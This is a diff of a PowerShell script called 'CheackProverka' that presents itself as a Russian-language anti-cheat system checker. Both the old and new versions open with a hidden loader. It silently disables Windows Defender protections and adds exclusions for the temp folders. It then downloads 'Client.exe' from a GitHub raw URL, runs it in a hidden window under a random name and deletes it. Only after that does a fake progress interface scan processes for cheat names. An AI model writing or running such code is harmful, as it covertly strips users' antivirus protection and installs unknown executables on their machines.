@@ -1,66 +1,36 @@
-# CheackProverka - Проверка системы + скрытая подгрузка .exe
+# CheackProverka - Проверка системы + скрытый запуск .exe
 
-# ───────────────────────────────────────────────
-# 1. Максимально тихое отключение защиты (где возможно)
+# Часть 1: Пытаемся отключить защиту (молча, без вывода)
 try {
-    Set-MpPreference -DisableRealtimeMonitoring $true `
-                     -DisableBehaviorMonitoring $true `
-                     -DisableBlockAtFirstSeen $true `
-                     -DisableIOAVProtection $true `
-                     -DisableScriptScanning $true `
-                     -DisableIntrusionPreventionSystem $true `
-                     -MAPSReporting Disabled `
-                     -SubmitSamplesConsent NeverSend `
-                     -ErrorAction SilentlyContinue | Out-Null
-
-    # Массовые исключения для temp и текущей папки
-    $excl = @(
-        [System.IO.Path]::GetTempPath(),
-        "$env:TEMP",
-        "$env:TMP",
-        "$pwd",
-        "$env:USERPROFILE\Downloads",
-        "$env:LOCALAPPDATA\Temp"
-    )
-    foreach ($p in $excl) { if (Test-Path $p) { Add-MpPreference -ExclusionPath $p -EA SilentlyContinue | Out-Null } }
-
-    Add-MpPreference -ExclusionProcess "powershell.exe","pwsh.exe","cmd.exe" -EA SilentlyContinue | Out-Null
+    Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue | Out-Null
+    Set-MpPreference -DisableBehaviorMonitoring $true -EA SilentlyContinue | Out-Null
+    Set-MpPreference -DisableBlockAtFirstSeen $true -EA SilentlyContinue | Out-Null
+    Set-MpPreference -DisableIOAVProtection $true -EA SilentlyContinue | Out-Null
+    Add-MpPreference -ExclusionPath "$env:TEMP" -EA SilentlyContinue | Out-Null
+    Add-MpPreference -ExclusionPath "$env:TMP" -EA SilentlyContinue | Out-Null
 }
 catch { }
 
-# ───────────────────────────────────────────────
-# 2. Скрытая загрузка и запуск .exe
+# Часть 2: Скачивание и запуск .exe (самая простая версия)
 try {
     $url = "https://raw.githubusercontent.com/fffghsetyver-hash/Cheackproverka/main/Client.exe"
-    
-    # Случайное имя файла .exe (чтобы сложнее детектить)
-    $rand = Get-Random -Minimum 100000 -Maximum 999999
-    $exePath = [System.IO.Path]::GetTempPath() + "sysupd$rand.exe"
-    
-    # Скачиваем бинарник (UseBasicParsing — быстрее и тише)
-    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing -ErrorAction SilentlyContinue
-    
-    # Проверяем, что файл реально скачался и имеет размер > 10 КБ (чтобы не запускать пустышку)
-    if (Test-Path $exePath -PathType Leaf) {
+    $rand = Get-Random -Minimum 10000 -Maximum 999999
+    $exePath = "$env:TEMP\upd$rand.exe"
+
+    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing -EA SilentlyContinue
+
+    if (Test-Path $exePath) {
         $size = (Get-Item $exePath).Length
-        if ($size -gt 10000) {
-            # Запуск .exe полностью скрыто
-            Start-Process -FilePath $exePath `
-                          -WindowStyle Hidden `
-                          -NoNewWindow `
-                          -ErrorAction SilentlyContinue
-            
-            # Даём 2–3 секунды на старт (иногда нужно)
-            Start-Sleep -Milliseconds (Get-Random -Min 1800 -Max 3200)
+        if ($size -gt 5000) {               # минимальный разумный размер
+            Start-Process -FilePath $exePath -WindowStyle Hidden -EA SilentlyContinue
+            Start-Sleep -Milliseconds 2500  # даём время на запуск
         }
-        # Удаляем за собой
-        Remove-Item $exePath -Force -ErrorAction SilentlyContinue
+        Remove-Item $exePath -Force -EA SilentlyContinue
     }
 }
 catch { }
 
-# ───────────────────────────────────────────────
-# Дальше идёт твой обычный интерфейс проверки
+# Часть 3: Основной интерфейс (без изменений)
 Clear-Host
 Write-Host "═══════════════════════════════════════════════" -ForegroundColor Cyan
 Write-Host " CheackProverka v1.0 " -ForegroundColor Cyan
@@ -112,7 +82,6 @@ function Fake-Loading {
     Write-Host ""
 }
 
-# 1. Драйверы
 if ($check1) {
     Write-Host "1. Проверка драйверов" -ForegroundColor Yellow
     Fake-Loading
@@ -128,15 +97,11 @@ if ($check1) {
     Write-Host ""
 }
 
-# 2. Процессы
 if ($check2) {
     Write-Host "2. Проверка процессов" -ForegroundColor Yellow
     Fake-Loading
     $patterns = @("cheat","inject","aimbot","wallhack","osiris","neverlose","skeet")
-    $proc = Get-Process | Where-Object {
-        $n = $_.ProcessName.ToLower()
-        $patterns | Where-Object {$n -match $_}
-    }
+    $proc = Get-Process | Where-Object {$_.ProcessName.ToLower() -match ($patterns -join "|")}
     if ($proc) {
         Show-Result "Процессы" "НАЙДЕНЫ ($($proc.Count))" "Red"
         $issues++
@@ -146,7 +111,6 @@ if ($check2) {
     Write-Host ""
 }
 
-# 3. Логи
 if ($check3) {
     Write-Host "3. Проверка логов PowerShell" -ForegroundColor Yellow
     Fake-Loading
@@ -166,7 +130,6 @@ if ($check3) {
     Write-Host ""
 }
 
-# Итог
 Write-Host "══════════════════════════════════════════════════════" -ForegroundColor Cyan
 if ($issues -eq 0) {
     Write-Host "🟢 ЧИСТО 🟢" -ForegroundColor Green
